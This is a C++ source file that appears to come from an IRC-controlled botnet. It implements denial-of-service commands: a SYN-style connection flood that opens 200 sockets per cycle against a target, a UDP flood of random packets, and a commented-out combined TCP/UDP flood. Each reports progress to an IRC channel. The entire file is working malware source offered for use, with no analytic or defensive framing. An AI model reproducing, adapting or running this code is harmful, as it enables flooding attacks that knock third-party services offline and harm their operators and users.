#include "../IRC.hpp"

#define MAX_PACK_LEN 65535
#define SIO_RCALL 0x98000001
#define SUPERSYN_SOCKETS 200

#define SYN_DPORT 2000
#define SYN_XORVAL 0xFFFFFFFF
#define SYN_SPOOF_TEST 2001
#define SYN_SPOOF_GOOD 2002

int IRC::CMDDDoSSYN(string ip, string port, int time) {
	if (ip == "" || port == "") {
		return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_ERRONEOUS));
	}
	int ssynDelay			=	100;
	SOCKADDR_IN			    SockAddr;
	SOCKET					sock[SUPERSYN_SOCKETS];
   	IN_ADDR					iaddr;
	LPHOSTENT lpHostEntry	= NULL;
 	DWORD mode = 1;
	int c = 0, i = 0;
	shouldDDoS = true;

	unsigned long targetIP = api->inet_addr(ip.c_str());
	unsigned short targetPort = (unsigned short)atoi(port.c_str());

	if (targetIP == INADDR_NONE) {
		/*hostent *pHE = api->gethostbyname(targetIP);
		if (pHE == 0)
			return INADDR_NONE;
		IP = *((unsigned long *)pHE->h_addr_list[0]);*/
		IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_NETFAIL);
		return 0;
	}

	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family =	AF_INET;
   	SockAddr.sin_port = api->htons(targetPort);
	iaddr.s_addr = targetIP;
	SockAddr.sin_addr = iaddr; //ip addy
	
	char buff[1024] = "\0";
	api->wsprintf(buff, "%s IP %s Port %s for %d seconds.", MSG_DDOS_DDOSING, ip.c_str(), port.c_str(), time);
	IRCSend(IRC_MSG, servers[currserver].channel, buff);
	DWORD begin = api->GetTickCount();
	if (time > 0) {
		while (((api->GetTickCount() - begin) / 1000) < time && shouldDDoS) {
			for (c = 0; c < SUPERSYN_SOCKETS; c++) {
				sock[c] = api->socket(AF_INET, SOCK_STREAM, 0);
   				if (sock[c] == INVALID_SOCKET)
      					continue;
				api->ioctlsocket(sock[c], FIONBIO, &mode);
			}
			for (c = 0; c < SUPERSYN_SOCKETS; c++)
  				api->connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      			api->Sleep(ssynDelay);
			for (c = 0; c < SUPERSYN_SOCKETS; c++)
				api->closesocket(sock[c]); //close sockets
		}
	} else if (time == 0) {
		while (shouldDDoS) {
			for (c = 0; c < SUPERSYN_SOCKETS; c++) {
				sock[c] = api->socket(AF_INET, SOCK_STREAM, 0);
   				if (sock[c] == INVALID_SOCKET)
      					continue;
				api->ioctlsocket(sock[c], FIONBIO, &mode);
			}
			for (c = 0; c < SUPERSYN_SOCKETS; c++)
  				api->connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      			api->Sleep(ssynDelay);
			for (c = 0; c < SUPERSYN_SOCKETS; c++)
				api->closesocket(sock[c]); //close sockets
		}
	}
	return(shouldDDoS ? IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_COMPLETE) : 0);
}

/*DWORD WINAPI UDP(LPVOID lpParam) {
struct DDOS {
	char	target[64];
	char	port[8];
	int		time;
	int		delay;
	SOCKET	sock;
	char	from[64];
};*/
int IRC::CMDDDoS(string ip, string port, int time, int ddosDelay, bool udp) {
	if (strcmp(ip.c_str(), "") == 0 || strcmp(port.c_str(), "") == 0)
		return(IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_ERRONEOUS));

	unsigned short	porta		= (unsigned short)atoi(port.c_str());
	int				packetsize	= 2750;
	
	char *pbuff = (char*)malloc(packetsize);
	
	shouldDDoS = true;

	SOCKADDR_IN ssin;
	SOCKET usock = api->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
   	IN_ADDR iaddr;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
   	ssin.sin_port = api->htons(porta);
	
	LPHOSTENT lpHostEntry = NULL;
 	iaddr.s_addr = api->inet_addr(ip.c_str());
	ssin.sin_addr = iaddr;
	
	for (int i = 0; i < packetsize; i++) {
		pbuff[i] = (char)(rand() % 255);
	}
	
	char buff[256] = "\0";
	sprintf(buff, MSG_DDOS_DDOSING, ip.c_str(), port.c_str(), time);
	IRCSend(IRC_MSG, servers[currserver].channel, buff);

	if (!udp)
		api->connect(usock, (SOCKADDR*)&ssin, sizeof(ssin));
	DWORD begin = GetTickCount();
	if	(time > 0) {
		while (((GetTickCount() - begin) / 1000) < time && shouldDDoS) {
			api->sendto(usock, pbuff, packetsize-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(ddosDelay);
		}
	} else if (time == 0) {
		while (shouldDDoS) {
			api->sendto(usock, pbuff, packetsize-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(ddosDelay);
		}
	}
	free(pbuff);
	shouldDDoS ? IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_COMPLETE) : IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_CANCELLED);
	return(1);
}

/*int IRC::CMDDDoS(string ip, string port, int time, int ddosDelay, unsigned int size, bool udp) {
	char			buff[1024] = {0};
	int				ret = 0, ppt = 0;
	SOCKET			sock;
	struct			sockaddr_in sin;
	BOOL			flag = TRUE;
	shouldDDoS = true;
	
    addrinfo *rs,
			 *pt,
			 ht;

	ZeroMemory(&ht, sizeof(ht));
	hints.ai_family				= AF_INET;
	if (!udp) {
		hints.ai_socktype		= SOCK_STREAM;
		hints.ai_protocol		= IPPROTO_TCP;
	} else {
		hints.ai_socktype		= SOCK_DGRAM;
		hints.ai_protocol		= IPPROTO_UDP;
	}

	sockaddr_in *sockaddr_ipv4;
	if (isalpha(ip.c_str()[0]) > 0) {
		if (api->getaddrinfo(ip.c_str(), port.c_str(), &ht, &rs) != 0)
			IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_NETFAIL);
		 for (pt=rs; pt != NULL; pt=pt->ai_next) {
			switch (pt->ai_family) {
				case AF_INET:
					sockaddr_ipv4 = (struct sockaddr_in *) pt->ai_addr;
					ip = api->inet_ntoa(sockaddr_ipv4->sin_addr);
					break;
			}
		}
	}
	
	if (udp)
		sock = api->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	else
		sock = api->socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		api->closesocket(sock);
		return 0;
	}
	srand(api->GetTickCount());
	ppt = (rand() % ((65535 - 1) + 1));
    
	sin.sin_addr.s_addr = api->inet_addr(ip.c_str());
	sin.sin_family = AF_INET;
	sin.sin_port = (atoi(port.c_str()) == 0 ? api->htons(ppt) : api->htons(atoi(port.c_str())));
	
	if (atoi(port.c_str()) == 0)
		api->wsprintf(buff, "%s Port %d.", MSG_DDOS_DDOSING, ppt);
	else
		api->wsprintf(buff, "%s IP %s Port %s for %d seconds with %d delay and %d packet size.", MSG_DDOS_DDOSING, ip.c_str(), port.c_str(), time, ddosDelay, size*1024);
	IRCSend(IRC_MSG, servers[currserver].channel, buff);
	//buff[0] = 0;
	char *Packet = new char[size*1024];
	DWORD begin = api->GetTickCount();
	if (!udp)
		api->connect(sock, (SOCKADDR*)&sin, sizeof(sin));
	while (((api->GetTickCount() - begin) / 1000) < time && shouldDDoS) {
		api->wsprintf(Packet, "%s", api->GenFileName(size*1024 - 1).c_str());
		if (api->sendto(sock, Packet, size*1024, 0, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) {
			IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_HOSTFAIL);
			break;
		}
		api->Sleep(ddosDelay);
	}
	api->closesocket(sock);
	try {
		delete Packet;
	} catch (...) {}
	if (ret > 0)
		return 0;
	return(shouldDDoS ? IRCSend(IRC_MSG, servers[currserver].channel, MSG_DDOS_COMPLETE) : 0);
}
*/